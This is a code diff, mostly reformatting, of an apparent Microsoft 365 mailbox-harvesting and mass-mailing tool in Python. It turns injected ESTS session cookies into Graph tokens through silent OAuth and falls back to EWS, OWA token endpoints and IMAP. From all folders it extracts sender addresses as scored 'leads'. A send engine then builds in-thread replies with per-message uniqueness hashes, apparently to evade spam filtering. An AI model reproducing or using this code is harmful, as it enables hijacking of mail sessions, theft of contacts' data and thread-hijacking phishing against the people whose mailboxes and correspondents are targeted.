+                                "__type": "TimeZoneDefinitionType:#Exchange",
+                                "Id": "UTC",
+                            },
+                        },
                     },
                     "Body": {
                         "__type": "FindItemRequest:#Exchange",
@@ -1503,9 +1930,15 @@ def extract_owa_session(
                             "__type": "ItemResponseShape:#Exchange",
                             "BaseShape": "IdOnly",
                             "AdditionalProperties": [
-                                {"__type": "PropertyUri:#Exchange", "FieldURI": "message:From"},
-                                {"__type": "PropertyUri:#Exchange", "FieldURI": "message:Sender"},
-                            ]
+                                {
+                                    "__type": "PropertyUri:#Exchange",
+                                    "FieldURI": "message:From",
+                                },
+                                {
+                                    "__type": "PropertyUri:#Exchange",
+                                    "FieldURI": "message:Sender",
+                                },
+                            ],
                         },
                         "IndexedPageItemView": {
                             "__type": "IndexedPageView:#Exchange",
@@ -1514,24 +1947,39 @@ def extract_owa_session(
                             "MaxEntriesReturned": page_size,
                         },
                         "ParentFolderIds": [
-                            {"__type": "DistinguishedFolderId:#Exchange", "Id": folder_id}
+                            {
+                                "__type": "DistinguishedFolderId:#Exchange",
+                                "Id": folder_id,
+                            }
                         ],
                         "SortOrder": [
-                            {"__type": "FieldOrder:#Exchange", "Order": "Descending",
-                             "Field": {"__type": "PropertyUri:#Exchange", "FieldURI": "item:DateTimeReceived"}}
+                            {
+                                "__type": "FieldOrder:#Exchange",
+                                "Order": "Descending",
+                                "Field": {
+                                    "__type": "PropertyUri:#Exchange",
+                                    "FieldURI": "item:DateTimeReceived",
+                                },
+                            }
                         ],
                         "Restriction": {
                             "__type": "RestrictionType:#Exchange",
                             "IsGreaterThan": {
                                 "__type": "IsGreaterThan:#Exchange",
-                                "Item": {"__type": "PropertyUri:#Exchange", "FieldURI": "item:DateTimeReceived"},
+                                "Item": {
+                                    "__type": "PropertyUri:#Exchange",
+                                    "FieldURI": "item:DateTimeReceived",
+                                },
                                 "FieldURIOrConstant": {
                                     "__type": "FieldURIOrConstant:#Exchange",
-                                    "Constant": {"__type": "ConstantValueType:#Exchange", "Value": date_after}
-                                }
-                            }
-                        }
-                    }
+                                    "Constant": {
+                                        "__type": "ConstantValueType:#Exchange",
+                                        "Value": date_after,
+                                    },
+                                },
+                            },
+                        },
+                    },
                 }
                 r = None
                 _svc_hosts = [_owa_host]
@@ -1545,20 +1993,23 @@ def extract_owa_session(
                             f"{_svc_host}/owa/service.svc?action=FindItem&app=Mail",
                             json=payload,
                             headers={
-                                "User-Agent":    _UA,
-                                "Action":        "FindItem",
-                                "X-OWA-Canary":  canary,
-                                "X-Req-Source":  "Mail",
-                                "Content-Type":  "application/json; charset=utf-8",
-                                "Accept":        "application/json",
-                                "Origin":        _svc_host,
-                                "Referer":       f"{_svc_host}/mail/",
+                                "User-Agent": _UA,
+                                "Action": "FindItem",
+                                "X-OWA-Canary": canary,
+                                "X-Req-Source": "Mail",
+                                "Content-Type": "application/json; charset=utf-8",
+                                "Accept": "application/json",
+                                "Origin": _svc_host,
+                                "Referer": f"{_svc_host}/mail/",
                             },
                             timeout=30,
                         )
                         if r.ok:
                             break
-                        yield {"type": "progress", "msg": f"service.svc {_svc_host[-20:]}/{folder_id}: HTTP {r.status_code}"}
+                        yield {
+                            "type": "progress",
+                            "msg": f"service.svc {_svc_host[-20:]}/{folder_id}: HTTP {r.status_code}",
+                        }
                     except Exception as e:
                         yield {"type": "progress", "msg": f"service.svc error: {e}"}
                         r = None
@@ -1575,7 +2026,14 @@ def extract_owa_session(
                 items = []
                 try:
                     body = data.get("Body", {})
-                    resp = body.get("FindItemResponseMessage", body.get("ResponseMessages", {}).get("Items", [{}])[0] if isinstance(body.get("ResponseMessages",{}).get("Items"), list) else {})
+                    resp = body.get(
+                        "FindItemResponseMessage",
+                        body.get("ResponseMessages", {}).get("Items", [{}])[0]
+                        if isinstance(
+                            body.get("ResponseMessages", {}).get("Items"), list
+                        )
+                        else {},
+                    )
                     root = resp.get("RootFolder", {})
                     items = root.get("Items", [])
                 except Exception:
@@ -1601,8 +2059,12 @@ def extract_owa_session(
                     if total >= limit:
                         break
 
-                yield {"type": "progress", "msg": f"{folder_id}: {folder_found} found so far",
-                       "folder": folder_id, "found": page_found}
+                yield {
+                    "type": "progress",
+                    "msg": f"{folder_id}: {folder_found} found so far",
+                    "folder": folder_id,
+                    "found": page_found,
+                }
 
                 if len(items) < page_size:
                     break
@@ -1614,9 +2076,13 @@ def extract_owa_session(
     # injected ESTS cookies are valid, Microsoft silently issues an auth code
     # which we exchange for a Graph Bearer token, then delegate to extract_graph().
     if not owa_worked and not canary:
-        yield {"type": "progress", "msg": "No OWA canary — trying OAuth2 silent auth via ESTS cookies…"}
+        yield {
+            "type": "progress",
+            "msg": "No OWA canary — trying OAuth2 silent auth via ESTS cookies…",
+        }
         _silent_token = None
         import urllib.parse as _urlparse
+
         for _cid in [cid for _, cid in MS_APPS[:3]]:
             if _silent_token:
                 break
@@ -1627,62 +2093,99 @@ def extract_owa_session(
                         f"?client_id={_cid}"
                         f"&response_type=code"
                         f"&response_mode=query"
-                        f"&redirect_uri=" + _urlparse.quote("https://login.microsoftonline.com/common/oauth2/nativeclient", safe="") +
-                        f"&scope=" + _urlparse.quote("https://graph.microsoft.com/.default offline_access", safe="") +
-                        f"&prompt=none"
+                        f"&redirect_uri="
+                        + _urlparse.quote(
+                            "https://login.microsoftonline.com/common/oauth2/nativeclient",
+                            safe="",
+                        )
+                        + "&scope="
+                        + _urlparse.quote(
+                            "https://graph.microsoft.com/.default offline_access",
+                            safe="",
+                        )
+                        + "&prompt=none"
                     )
-                    _ar = session.get(_silent_url, allow_redirects=True,
-                                      timeout=15, headers={"User-Agent": _UA})
-                    _code_m = re.search(r'[?&]code=([^&#]+)', _ar.url)
+                    _ar = session.get(
+                        _silent_url,
+                        allow_redirects=True,
+                        timeout=15,
+                        headers={"User-Agent": _UA},
+                    )
+                    _code_m = re.search(r"[?&]code=([^&#]+)", _ar.url)
                     if _code_m:
                         _code = _urlparse.unquote(_code_m.group(1))
                         _tok_r = session.post(
                             f"https://login.microsoftonline.com/{_tenant}/oauth2/v2.0/token",
-                            data={"grant_type": "authorization_code", "code": _code,
-                                  "redirect_uri": "https://login.microsoftonline.com/common/oauth2/nativeclient",
-                                  "client_id": _cid,
-                                  "scope": "https://graph.microsoft.com/.default offline_access"},
+                            data={
+                                "grant_type": "authorization_code",
+                                "code": _code,
+                                "redirect_uri": "https://login.microsoftonline.com/common/oauth2/nativeclient",
+                                "client_id": _cid,
+                                "scope": "https://graph.microsoft.com/.default offline_access",
+                            },
                             timeout=15,
                         )
                         if _tok_r.ok:
                             _silent_token = _tok_r.json().get("access_token", "")
                             if _silent_token:
                                 break
-                    elif "error=interaction_required" in _ar.url or "error=login_required" in _ar.url:
-                        yield {"type": "progress", "msg": f"Silent auth ({_tenant}): MFA/interaction required"}
+                    elif (
+                        "error=interaction_required" in _ar.url
+                        or "error=login_required" in _ar.url
+                    ):
+                        yield {
+                            "type": "progress",
+                            "msg": f"Silent auth ({_tenant}): MFA/interaction required",
+                        }
                         break
                 except Exception as _se:
                     yield {"type": "progress", "msg": f"Silent auth error: {_se}"}
                     break
 
         if _silent_token:
-            yield {"type": "progress", "msg": "✓ Silent auth token obtained — switching to Graph API extraction"}
+            yield {
+                "type": "progress",
+                "msg": "✓ Silent auth token obtained — switching to Graph API extraction",
+            }
             yield from extract_graph(
-                token=_silent_token, folder_ids=folders,
-                limit=limit, filter_generic=filter_generic,
-                only_domains=only_domains, block_domains=block_domains,
+                token=_silent_token,
+                folder_ids=folders,
+                limit=limit,
+                filter_generic=filter_generic,
+                only_domains=only_domains,
+                block_domains=block_domains,
                 date_after=date_after,
             )
             return
         else:
-            yield {"type": "progress", "msg": "OAuth2 silent auth failed — ESTS cookies may be expired or MFA is enforced"}
+            yield {
+                "type": "progress",
+                "msg": "OAuth2 silent auth failed — ESTS cookies may be expired or MFA is enforced",
+            }
 
     # ── Strategy 2: EWS SOAP fallback ─────────────────────────────
     if not owa_worked:
         yield {"type": "progress", "msg": "OWA API unavailable — trying EWS SOAP…"}
-        for folder_ref in (folders or ["inbox"]):
+        for folder_ref in folders or ["inbox"]:
             if total >= limit:
                 break
             ews_id_map = {
-                "inbox": "inbox", "sentitems": "sentitems", "deleteditems": "deleteditems",
-                "junkemail": "junkemail", "drafts": "drafts", "archive": "archive",
+                "inbox": "inbox",
+                "sentitems": "sentitems",
+                "deleteditems": "deleteditems",
+                "junkemail": "junkemail",
+                "drafts": "drafts",
+                "archive": "archive",
             }
             ews_id = ews_id_map.get(folder_ref.lower(), None)
-            folder_xml = f'<t:DistinguishedFolderId Id="{ews_id}"/>' if ews_id else f'<t:FolderId Id="{folder_ref}"/>'
+            folder_xml = (
+                f'<t:DistinguishedFolderId Id="{ews_id}"/>'
+                if ews_id
+                else f'<t:FolderId Id="{folder_ref}"/>'
+            )
             offset = 0
             page_size = 100
             folder_found = 0
-            ews_folder_ok = False
 
             while total < limit:
                 soap = f"""<?xml version="1.0" encoding="utf-8"?>
@@ -1715,9 +2218,9 @@ def extract_owa_session(
                         "https://outlook.office365.com/EWS/Exchange.asmx",
                         data=soap,
                         headers={
-                            "User-Agent":   _UA,
+                            "User-Agent": _UA,
                             "Content-Type": "text/xml; charset=utf-8",
-                            "SOAPAction":   '"http://schemas.microsoft.com/exchange/services/2006/messages/FindItem"',
+                            "SOAPAction": '"http://schemas.microsoft.com/exchange/services/2006/messages/FindItem"',
                         },
                         timeout=30,
                     )
@@ -1729,49 +2232,70 @@ def extract_owa_session(
                     if r.status_code in (401, 403):
                         # EWS blocked — try to get a Bearer token from the OWA session
                         # and re-route to Graph API extraction
-                        yield {"type": "progress", "msg": f"EWS returned {r.status_code} — trying Graph API via OWA session…"}
+                        yield {
+                            "type": "progress",
+                            "msg": f"EWS returned {r.status_code} — trying Graph API via OWA session…",
+                        }
                         _bt = None
                         for _p in ["/owa/auth/oauthtoken", "/owa/0/oauthtoken"]:
                             try:
                                 _tr = session.post(
                                     f"https://outlook.office365.com{_p}",
-                                    data={"resource": "https://graph.microsoft.com",
-                                          "grant_type": "implicit"},
-                                    headers={"User-Agent": _UA,
-                                             "Origin": "https://outlook.office365.com",
-                                             "X-Requested-With": "XMLHttpRequest"},
+                                    data={
+                                        "resource": "https://graph.microsoft.com",
+                                        "grant_type": "implicit",
+                                    },
+                                    headers={
+                                        "User-Agent": _UA,
+                                        "Origin": "https://outlook.office365.com",
+                                        "X-Requested-With": "XMLHttpRequest",
+                                    },
                                     timeout=12,
                                 )
                                 if _tr.ok:
                                     _j = _tr.json()
-                                    _bt = _j.get("access_token") or _j.get("token") or ""
+                                    _bt = (
+                                        _j.get("access_token") or _j.get("token") or ""
+                                    )
                                     if _bt:
                                         break
                             except Exception:
                                 pass
                         if _bt:
-                            yield {"type": "progress", "msg": "✓ Got Graph token — switching to Graph API extraction"}
+                            yield {
+                                "type": "progress",
+                                "msg": "✓ Got Graph token — switching to Graph API extraction",
+                            }
                             yield from extract_graph(
-                                token=_bt, folder_ids=folders,
-                                limit=limit, filter_generic=filter_generic,
-                                only_domains=only_domains, block_domains=block_domains,
+                                token=_bt,
+                                folder_ids=folders,
+                                limit=limit,
+                                filter_generic=filter_generic,
+                                only_domains=only_domains,
+                                block_domains=block_domains,
                                 date_after=date_after,
                             )
                             return
-                        yield {"type": "error", "msg": f"SESSION_AUTH_FAILED: EWS is blocked (HTTP {r.status_code}) and Graph token upgrade failed. Use Device Code flow for reliable access."}
+                        yield {
+                            "type": "error",
+                            "msg": f"SESSION_AUTH_FAILED: EWS is blocked (HTTP {r.status_code}) and Graph token upgrade failed. Use Device Code flow for reliable access.",
+                        }
                         return
                     break
 
                 if "<soap:Fault>" in r.text or "ErrorAccessDenied" in r.text:
-                    err_m = re.search(r'<m:MessageText>([^<]+)</m:MessageText>', r.text)
-                    yield {"type": "error", "msg": f"SESSION_AUTH_FAILED: EWS access denied — {err_m.group(1) if err_m else 'no token'}. Use Device Code flow."}
+                    err_m = re.search(r"<m:MessageText>([^<]+)</m:MessageText>", r.text)
+                    yield {
+                        "type": "error",
+                        "msg": f"SESSION_AUTH_FAILED: EWS access denied — {err_m.group(1) if err_m else 'no token'}. Use Device Code flow.",
+                    }
                     return
 
                 emails_in_page = re.findall(
-                    r'<t:(?:EmailAddress|Address)>([^<@\s]+@[^<\s]+)</t:(?:EmailAddress|Address)>',
-                    r.text
+                    r"<t:(?:EmailAddress|Address)>([^<@\s]+@[^<\s]+)</t:(?:EmailAddress|Address)>",
+                    r.text,
                 )
-                more_m  = re.search(r'IncludesLastItemInRange="(true|false)"', r.text)
+                more_m = re.search(r'IncludesLastItemInRange="(true|false)"', r.text)
                 is_last = (more_m.group(1) == "true") if more_m else True
 
                 for addr in emails_in_page:
@@ -1779,23 +2303,29 @@ def extract_owa_session(
                         seen.add(addr.lower())
                         total += 1
                         folder_found += 1
-                        ews_folder_ok = True
                         yield {"type": "lead", "email": addr.lower()}
                         if total >= limit:
                             break
 
-                yield {"type": "progress", "msg": f"EWS {folder_ref}: {folder_found} found",
-                       "folder": folder_ref, "found": folder_found}
+                yield {
+                    "type": "progress",
+                    "msg": f"EWS {folder_ref}: {folder_found} found",
+                    "folder": folder_ref,
+                    "found": folder_found,
+                }
 
                 if is_last or not emails_in_page:
                     break
                 offset += page_size
 
     if total == 0 and not owa_worked:
-        yield {"type": "error", "msg": "SESSION_AUTH_FAILED: No emails extracted via OWA session cookies. "
-               "Microsoft often restricts API access with browser cookies. "
-               "For best results: use Device Code flow (Microsoft 365 → Auth Tips → Start Device Code Flow), "
-               "or paste a bearer token from developer.microsoft.com/graph/graph-explorer."}
+        yield {
+            "type": "error",
+            "msg": "SESSION_AUTH_FAILED: No emails extracted via OWA session cookies. "
+            "Microsoft often restricts API access with browser cookies. "
+            "For best results: use Device Code flow (Microsoft 365 → Auth Tips → Start Device Code Flow), "
+            "or paste a bearer token from developer.microsoft.com/graph/graph-explorer.",
+        }
         return
 
     yield {"type": "done", "total": total}
@@ -1805,6 +2335,7 @@ def extract_owa_session(
 # EXTRACTION — IMAP
 # ═══════════════════════════════════════════════════════════════
 
+
 def _parse_from_header(raw: str) -> tuple:
     """
     Parse a From: / Sender: header into (email_addr, display_name).
@@ -1813,27 +2344,26 @@ def _parse_from_header(raw: str) -> tuple:
     parts = _decode_hdr(raw or "")
     s = ""
     for p, c in parts:
-        s += (p.decode(c or "utf-8", errors="replace")
-              if isinstance(p, bytes) else p)
+        s += p.decode(c or "utf-8", errors="replace") if isinstance(p, bytes) else p
     # Angle-bracket format: "Name <addr@domain>"
-    m = re.search(r'<([^>]+@[^>]+)>', s)
+    m = re.search(r"<([^>]+@[^>]+)>", s)
     addr = m.group(1).strip().lower() if m else None
     if not addr:
-        m2 = re.search(r'[\w.+%-]+@[\w.-]+\.\w+', s)
+        m2 = re.search(r"[\w.+%-]+@[\w.-]+\.\w+", s)
         addr = m2.group(0).strip().lower() if m2 else None
-    name = re.sub(r'<[^>]+>', '', s).strip().strip('"').strip("'").strip()
+    name = re.sub(r"<[^>]+>", "", s).strip().strip('"').strip("'").strip()
     return addr, name
 
 
 def extract_imap(
-    conn:           imaplib.IMAP4,
-    folders:        list,
-    limit:          Optional[int]   = None,
-    filter_generic: bool            = True,
-    only_domains:   Optional[set]   = None,
-    block_domains:  Optional[set]   = None,
-    subject_kw:     Optional[str]   = None,
-    date_after:     Optional[str]   = None,    # "YYYY-MM-DD"
+    conn: imaplib.IMAP4,
+    folders: list,
+    limit: Optional[int] = None,
+    filter_generic: bool = True,
+    only_domains: Optional[set] = None,
+    block_domains: Optional[set] = None,
+    subject_kw: Optional[str] = None,
+    date_after: Optional[str] = None,  # "YYYY-MM-DD"
 ) -> Generator:
     """
     Generator — reads each selected folder and yields progress events.
@@ -1848,7 +2378,7 @@ def extract_imap(
     Fetches only headers + BODYSTRUCTURE (not body content) for speed.
     """
     raw_results = []
-    total_done  = 0
+    total_done = 0
 
     for folder_name in folders:
         try:
@@ -1881,8 +2411,10 @@ def extract_imap(
             if limit and len(ids) > limit:
                 ids = ids[-limit:]  # most recent
 
-            yield {"type": "log",
-                   "msg": f"Reading {folder_name}: {len(ids):,} messages"}
+            yield {
+                "type": "log",
+                "msg": f"Reading {folder_name}: {len(ids):,} messages",
+            }
 
             CHUNK = 50
             for i in range(0, len(ids), CHUNK):
@@ -1900,7 +2432,7 @@ def extract_imap(
                     continue
 
                 # IMAP fetch returns interleaved tuples and bytes
-                current_hdr   = b""
+                current_hdr = b""
                 current_struct = b""
                 for part in data:
                     if isinstance(part, tuple):
@@ -1912,21 +2444,29 @@ def extract_imap(
                     if isinstance(part, bytes) and part.strip() == b")":
                         if current_hdr:
                             _process_imap_msg(
-                                current_hdr, current_struct,
-                                folder_name, filter_generic,
-                                only_domains, block_domains, subject_kw,
+                                current_hdr,
+                                current_struct,
+                                folder_name,
+                                filter_generic,
+                                only_domains,
+                                block_domains,
+                                subject_kw,
                                 raw_results,
                             )
                             total_done += 1
-                            current_hdr   = b""
+                            current_hdr = b""
                             current_struct = b""
 
                 # Process any remaining
                 if current_hdr:
                     _process_imap_msg(
-                        current_hdr, current_struct,
-                        folder_name, filter_generic,
-                        only_domains, block_domains, subject_kw,
+                        current_hdr,
+                        current_struct,
+                        folder_name,
+                        filter_generic,
+                        only_domains,
+                        block_domains,
+                        subject_kw,
                         raw_results,
                     )
                     total_done += len(chunk) - sum(
@@ -1945,22 +2485,22 @@ def extract_imap(
             yield {"type": "error", "msg": f"Folder {folder_name}: {exc}"}
 
     yield {
-        "type":    "extracted",
-        "total":   total_done,
-        "found":   len(raw_results),
+        "type": "extracted",
+        "total": total_done,
+        "found": len(raw_results),
         "results": raw_results,
     }
 
 
 def _process_imap_msg(
-    raw_header:   bytes,
-    raw_struct:   bytes,
-    folder_name:  str,
+    raw_header: bytes,
+    raw_struct: bytes,
+    folder_name: str,
     filter_generic: bool,
     only_domains: Optional[set],
     block_domains: Optional[set],
-    subject_kw:   Optional[str],
-    out:          list,
+    subject_kw: Optional[str],
+    out: list,
 ) -> None:
     """Parse one IMAP message header block and append to out if it passes filters."""
     try:
@@ -1978,32 +2518,45 @@ def _process_imap_msg(
         if block_domains and edom in block_domains:
             return
 
-        subj_raw = (msg_hdr.get("Subject", "") or "")
+        subj_raw = msg_hdr.get("Subject", "") or ""
         if subject_kw and subject_kw.lower() not in subj_raw.lower():
             return
 
-        ct         = (msg_hdr.get("Content-Type", "") or "").lower()
-        struct_str = (raw_struct.decode("utf-8", errors="replace")
-                      if raw_struct else "").upper()
-        is_html    = "text/html" in ct or '"TEXT" "HTML"' in struct_str
-        has_att    = any(x in struct_str for x in [
-            ".PDF", ".DOC", ".XLS", ".PPT", ".ZIP", ".RAR",
-            ".CSV", "APPLICATION/", "\"ATTACHMENT\"",
-        ])
+        ct = (msg_hdr.get("Content-Type", "") or "").lower()
+        struct_str = (
+            raw_struct.decode("utf-8", errors="replace") if raw_struct else ""
+        ).upper()
+        is_html = "text/html" in ct or '"TEXT" "HTML"' in struct_str
+        has_att = any(
+            x in struct_str
+            for x in [
+                ".PDF",
+                ".DOC",
+                ".XLS",
+                ".PPT",
+                ".ZIP",
+                ".RAR",
+                ".CSV",
+                "APPLICATION/",
+                '"ATTACHMENT"',
+            ]
+        )
 
         message_id = (msg_hdr.get("Message-ID", "") or "").strip()
-        date_raw   = (msg_hdr.get("Date", "") or "")[:30]
+        date_raw = (msg_hdr.get("Date", "") or "")[:30]
 
-        out.append({
-            "addr":       addr,
-            "name":       name or "",
-            "date":       date_raw,
-            "subject":    subj_raw[:150],
-            "message_id": message_id,
-            "is_html":    is_html,
-            "has_att":    has_att,
-            "folder":     folder_name,
-        })
+        out.append(
+            {
+                "addr": addr,
+                "name": name or "",
+                "date": date_raw,
+                "subject": subj_raw[:150],
+                "message_id": message_id,
+                "is_html": is_html,
+                "has_att": has_att,
+                "folder": folder_name,
+            }
+        )
     except Exception:
         pass
 
@@ -2012,15 +2565,16 @@ def _process_imap_msg(
 # EXTRACTION — MS GRAPH
 # ═══════════════════════════════════════════════════════════════
 
+
 def extract_graph(
-    token:          str,
-    folder_ids:     list,             # list of Graph folder IDs or ["Inbox"]
-    limit:          Optional[int]   = None,
-    filter_generic: bool            = True,
-    only_domains:   Optional[set]   = None,
-    block_domains:  Optional[set]   = None,
-    subject_kw:     Optional[str]   = None,
-    date_after:     Optional[str]   = None,
+    token: str,
+    folder_ids: list,  # list of Graph folder IDs or ["Inbox"]
+    limit: Optional[int] = None,
+    filter_generic: bool = True,
+    only_domains: Optional[set] = None,
+    block_domains: Optional[set] = None,
+    subject_kw: Optional[str] = None,
+    date_after: Optional[str] = None,
 ) -> Generator:
     """
     Generator — reads each folder via MS Graph API and yields progress events.
@@ -2030,21 +2584,23 @@ def extract_graph(
         yield {"type": "error", "msg": "requests library not available"}
         return
 
-    h           = {"Authorization": f"Bearer {token}"}
+    h = {"Authorization": f"Bearer {token}"}
     raw_results = []
-    total_done  = 0
-    cap         = int(limit) if limit else 999999
+    total_done = 0
+    cap = int(limit) if limit else 999999
 
     # Default: all common folders when none specified
     _default_graph_folders = ["Inbox", "SentItems", "DeletedItems", "JunkEmail"]
-    for folder_id in (folder_ids or _default_graph_folders):
+    for folder_id in folder_ids or _default_graph_folders:
         yield {"type": "progress", "msg": f"📂 Connecting to {folder_id}…"}
 
         # Build filter
         filters = []
         if date_after:
             # Ensure clean ISO format without duplicate timezone suffix
-            date_str = date_after.replace("T00:00:00Z","").replace("T00:00:00","").strip()
+            date_str = (
+                date_after.replace("T00:00:00Z", "").replace("T00:00:00", "").strip()
+            )
             filters.append(f"receivedDateTime ge {date_str}T00:00:00Z")
 
         if folder_id == "Inbox" or folder_id.lower() == "inbox":
@@ -2053,16 +2609,16 @@ def extract_graph(
             base = f"{GRAPH}/me/mailFolders/{folder_id}/messages"
 
         params = {
-            "$select":  "from,receivedDateTime,subject,hasAttachments,"
-                        "internetMessageId,conversationId",
-            "$top":     100,
+            "$select": "from,receivedDateTime,subject,hasAttachments,"
+            "internetMessageId,conversationId",
+            "$top": 100,
         }
         if filters:
             params["$filter"] = " and ".join(filters)
         else:
             params["$orderby"] = "receivedDateTime desc"
 
-        url  = base
+        url = base
         done = 0
 
         while url and (total_done + done) < cap:
@@ -2073,10 +2629,13 @@ def extract_graph(
                     return
                 if not r.ok:
                     try:
-                        err_detail = r.json().get("error",{}).get("message","")[:200]
+                        err_detail = r.json().get("error", {}).get("message", "")[:200]
                     except Exception:
                         err_detail = r.text[:200]
-                    yield {"type": "error", "msg": f"Graph API {r.status_code}: {err_detail}"}
+                    yield {
+                        "type": "error",
+                        "msg": f"Graph API {r.status_code}: {err_detail}",
+                    }
                     break
                 data = r.json()
                 msgs = data.get("value", [])
@@ -2088,9 +2647,9 @@ def extract_graph(
                         break
                     done += 1
                     try:
-                        frm   = (m.get("from") or {}).get("emailAddress") or {}
-                        addr  = (frm.get("address") or "").strip().lower()
-                        name  = (frm.get("name") or "").strip()
+                        frm = (m.get("from") or {}).get("emailAddress") or {}
+                        addr = (frm.get("address") or "").strip().lower()
+                        name = (frm.get("name") or "").strip()
                         if not addr or "@" not in addr:
                             continue
                     except Exception:
@@ -2103,37 +2662,39 @@ def extract_graph(
                         continue
                     if block_domains and edom in block_domains:
                         continue
-                    subj = (m.get("subject", "") or "")
+                    subj = m.get("subject", "") or ""
                     if subject_kw and subject_kw.lower() not in subj.lower():
                         continue
 
                     body_type = ((m.get("body") or {}).get("contentType") or "").lower()
-                    has_att   = m.get("hasAttachments", False)
-                    is_html   = body_type == "html"
-                    msg_id    = (m.get("internetMessageId") or "").strip()
-                    dt        = (m.get("receivedDateTime") or "")[:19].replace("T", " ")
+                    has_att = m.get("hasAttachments", False)
+                    is_html = body_type == "html"
+                    msg_id = (m.get("internetMessageId") or "").strip()
+                    dt = (m.get("receivedDateTime") or "")[:19].replace("T", " ")
 
-                    raw_results.append({
-                        "addr":       addr,
-                        "name":       name,
-                        "date":       dt,
-                        "subject":    subj[:150],
-                        "message_id": msg_id,
-                        "is_html":    is_html,
-                        "has_att":    has_att,
-                        "folder":     folder_id,
-                        "conv_id":    m.get("conversationId", ""),
-                    })
+                    raw_results.append(
+                        {
+                            "addr": addr,
+                            "name": name,
+                            "date": dt,
+                            "subject": subj[:150],
+                            "message_id": msg_id,
+                            "is_html": is_html,
+                            "has_att": has_att,
+                            "folder": folder_id,
+                            "conv_id": m.get("conversationId", ""),
+                        }
+                    )
 
-                url    = data.get("@odata.nextLink")
+                url = data.get("@odata.nextLink")
                 params = {}
                 total_done += done
                 done = 0
                 yield {
-                    "type":   "progress",
-                    "msg":    f"{folder_id}: {total_done} scanned, {len(raw_results)} leads",
-                    "done":   total_done,
-                    "found":  len(raw_results),
+                    "type": "progress",
+                    "msg": f"{folder_id}: {total_done} scanned, {len(raw_results)} leads",
+                    "done": total_done,
+                    "found": len(raw_results),
                     "folder": folder_id,
                 }
 
@@ -2142,9 +2703,9 @@ def extract_graph(
                 break
 
     yield {
-        "type":    "extracted",
-        "total":   total_done,
-        "found":   len(raw_results),
+        "type": "extracted",
+        "total": total_done,
+        "found": len(raw_results),
         "results": raw_results,
     }
 
@@ -2154,24 +2715,47 @@ def extract_graph(
 # ═══════════════════════════════════════════════════════════════
 
 # Freemail domains — lower score (personal rather than business)
-_FREEMAIL = frozenset({
-    "gmail.com", "googlemail.com", "yahoo.com", "ymail.com",
-    "yahoo.co.uk", "yahoo.co.jp", "yahoo.com.au",
-    "hotmail.com", "hotmail.co.uk", "hotmail.fr",
-    "outlook.com", "live.com", "live.ca", "live.co.uk",
-    "msn.com", "aol.com", "icloud.com", "me.com", "mac.com",
-    "gmx.com", "gmx.net", "gmx.de", "web.de",
-    "protonmail.com", "proton.me", "pm.me",
-    "fastmail.com", "fastmail.fm",
-    "zoho.com", "zohomail.com",
-})
+_FREEMAIL = frozenset(
+    {
+        "gmail.com",
+        "googlemail.com",
+        "yahoo.com",
+        "ymail.com",
+        "yahoo.co.uk",
+        "yahoo.co.jp",
+        "yahoo.com.au",
+        "hotmail.com",
+        "hotmail.co.uk",
+        "hotmail.fr",
+        "outlook.com",
+        "live.com",
+        "live.ca",
+        "live.co.uk",
+        "msn.com",
+        "aol.com",
+        "icloud.com",
+        "me.com",
+        "mac.com",
+        "gmx.com",
+        "gmx.net",
+        "gmx.de",
+        "web.de",
+        "protonmail.com",
+        "proton.me",
+        "pm.me",
+        "fastmail.com",
+        "fastmail.fm",
+        "zoho.com",
+        "zohomail.com",
+    }
+)
 
 
 def sanitize_leads(
-    raw_results:     list,
-    filter_generic:  bool = True,
-    dedup_domain:    bool = False,
-    score_threshold: int  = 0,
+    raw_results: list,
+    filter_generic: bool = True,
+    dedup_domain: bool = False,
+    score_threshold: int = 0,
 ) -> list:
     """
     Convert raw extraction results into sorted, deduplicated B2BLead objects.
@@ -2204,7 +2788,7 @@ def sanitize_leads(
         by_addr[addr].append(r)
 
     ninety_ago = datetime.utcnow() - timedelta(days=90)
-    leads      = []
+    leads = []
 
     for addr, msgs in by_addr.items():
         # Sort most recent first
@@ -2216,14 +2800,15 @@ def sanitize_leads(
                 except ValueError:
                     continue
             return datetime.min
+
         msgs.sort(key=_dt, reverse=True)
 
         latest = msgs[0]
         domain = addr.split("@")[-1]
-        count  = len(msgs)
+        count = len(msgs)
 
         # Deduplicate message IDs (preserving order, most recent first)
-        seen_mids : set = set()
+        seen_mids: set = set()
         thread_ids: list = []
         for m in msgs:
             mid = (m.get("message_id") or "").strip()
@@ -2252,19 +2837,21 @@ def sanitize_leads(
         if score < score_threshold:
             continue
 
-        leads.append(B2BLead(
-            email        = addr,
-            name         = (latest.get("name") or ""),
-            last_subject = (latest.get("subject") or ""),
-            last_date    = (latest.get("date") or ""),
-            message_id   = thread_ids[0] if thread_ids else "",
-            thread_ids   = thread_ids,
-            folder       = (latest.get("folder") or "INBOX"),
-            msg_count    = count,
-            is_html      = bool(latest.get("is_html")),
-            has_att      = bool(latest.get("has_att")),
-            score        = score,
-        ))
+        leads.append(
+            B2BLead(
+                email=addr,
+                name=(latest.get("name") or ""),
+                last_subject=(latest.get("subject") or ""),
+                last_date=(latest.get("date") or ""),
+                message_id=thread_ids[0] if thread_ids else "",
+                thread_ids=thread_ids,
+                folder=(latest.get("folder") or "INBOX"),
+                msg_count=count,
+                is_html=bool(latest.get("is_html")),
+                has_att=bool(latest.get("has_att")),
+                score=score,
+            )
+        )
 
     # Domain dedup — keep highest-scored lead per domain
     if dedup_domain:
@@ -2283,21 +2870,22 @@ def sanitize_leads(
 # SEND ENGINE
 # ═══════════════════════════════════════════════════════════════
 
+
 def _make_reply_subject(original: str) -> str:
     s = (original or "").strip()
-    return s if re.match(r'^re:\s*', s, re.I) else f"Re: {s}"
+    return s if re.match(r"^re:\s*", s, re.I) else f"Re: {s}"
 
 
 def _build_mime(
-    from_email:   str,
-    from_name:    str,
-    to_email:     str,
-    to_name:      str,
-    subject:      str,
-    html:         str,
-    plain:        str,
-    reply_to_mid: str  = "",
-    attachments:  list = None,
+    from_email: str,
+    from_name: str,
+    to_email: str,
+    to_name: str,
+    subject: str,
+    html: str,
+    plain: str,
+    reply_to_mid: str = "",
+    attachments: list = None,
 ) -> MIMEMultipart:
     """
     Build a properly structured MIME message.
@@ -2317,53 +2905,66 @@ def _build_mime(
     # Multi-point uniqueness — top comment + bottom div + plain text marker
     if html or plain:
         import time as _time_mod
-        _uhash = hashlib.sha256(f"{to_email}|{from_email}|{_time_mod.time_ns()}".encode()).hexdigest()
+
+        _uhash = hashlib.sha256(
+            f"{to_email}|{from_email}|{_time_mod.time_ns()}".encode()
+        ).hexdigest()
         if html:
-            _top_cmt = f'<!--r:{_uhash[:8]}-->'
